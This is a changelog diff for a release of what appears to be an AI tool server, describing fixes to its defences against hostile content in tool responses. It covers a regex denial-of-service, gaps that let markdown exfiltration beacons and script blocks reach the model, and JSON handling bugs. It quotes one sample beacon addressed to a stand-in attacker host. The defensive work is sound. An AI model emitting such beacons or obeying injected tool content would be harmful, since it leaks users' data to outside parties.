@@ -7,16 +7,39 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [3.4.0] - 2026-09-02
 
-### Fixed
+### Security
 
+- **A quadratic scan in the response strip path could block the event loop for 82 seconds.** Four of
+  the five markdown beacon patterns shared a `[^\]\n]*` label class, so a failing match attempt
+  scanned forward from every `[` in the input: O(n) attempts of O(n). 256 KB of `[` measured 82.9 s,
+  synchronously, on the thread serving every session — on stdio the server is dead for the duration,
+  on HTTP every session stalls. The `<script`/`<style` openers had the same shape at 4.5 s. The
+  patterns' own docblock claimed the 256 KB cap guaranteed "wall-clock < 100 ms on any adversarial
+  input"; it was wrong by ~800×, because a byte cap bounds the input and never the cost. Now linear
+  by construction: 82.9 s → 1.4 ms and 4.5 s → 0.1 ms. The ReDoS guard that should have caught it
+  fed a single opener, which the pattern consumed in one match, so it could not fail.
 - **Custom tools, hook short-circuits and YAML endpoints now get the full response defence.** The
   post-processor wrap ran `sanitizeAndDetect` alone — Step 2 of the five in `defendText` — so a
   `registerCustomTool()` handler returning remote markdown or HTML reached the model with
   exfiltration beacons (`![x](https://attacker/?d=…)`) and `<script>` blocks intact. For those
-  channels the wrap is the *only* defence; there is no `processResponse` upstream of them. The wrap
-  now runs the whole pipeline, selecting the strictest grammar because the Content-Type is
-  genuinely unknown at that boundary, and excluding text that parses as a JSON document for the
-  same reason `processResponse` does.
+  channels the wrap is the *only* defence; there is no `processResponse` upstream of them.
+- **A beacon inside a JSON string value no longer reaches the model.** The JSON exemption protects a
+  persisted artefact — `processResponse` writes post-strip content to disk and `jq_query` reads it
+  back — and that reasoning does not reach the wrap, whose channels write to no disk. What is
+  persisted keeps the exemption; what is returned does not.
+
+### Fixed
+
+- **An unclosed `<!--`, `<script>` or `<style>` no longer deletes the rest of the payload.** The
+  open-to-end-of-input arm replaced with an empty string, so one unclosed opener truncated
+  everything after it — silently, with no marker, no `isError` and no observable length delta.
+  `"before <!-- unclosed\nafter"` returned `"before "`. Balanced blocks are still removed whole; an
+  orphan opener now has its tag removed and its body kept as inert text, which satisfies the CodeQL
+  incomplete-sanitization rule the arm was added for without deleting the caller's content.
+- **A JSON body served with a markup `Content-Type` is no longer corrupted.** The entity decode
+  turned `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}`, which no longer parses — and `save_to_file`
+  persisted it for `jq_query` to fail on. The sniffed arm already excluded JSON bodies; the declared
+  arm did not, so one mislabelled header was enough.
 
 ### Added
 
@@ -27,11 +50,16 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Changed
 
-- **`curl_execute` and `jq_query` results are unchanged, deliberately.** Both already run the
-  pipeline under the Content-Type the origin declared, and now mark their successful results so the
-  wrap defers to that better-informed pass rather than re-deciding a grammar it cannot see. Without
-  it, the defence a body received would have depended on `include_metadata`. Their *error* results
-  are not marked and take the full pipeline.
+- **`contentTypeUndetermined` is a required field on `DefendTextOptions`.** Not a breaking change:
+  the type and the function it configures are both new in this release, so no consumer can be
+  holding the optional form. Both grammar selectors
+  were optional and absence resolved to the *permissive* arm, so `defendText(text, { hostname })`
+  compiled, looked defended, and ran Step 2 alone. Pass `false` when you know the content type —
+  including knowing the origin sent none — and `true` when you could not determine it.
+- Markdown link and image syntax in a `text/plain` or `text/html` tool result is now rewritten to
+  `[link removed]` / `[image removed]` at the wrap. Previously this depended on `include_metadata`:
+  with it true the body sat inside a JSON envelope that the exemption protected, with it false it
+  did not, so the same bytes got two different treatments selected by an output-format flag.
 
 ## [3.3.0] - 2026-09-01
 
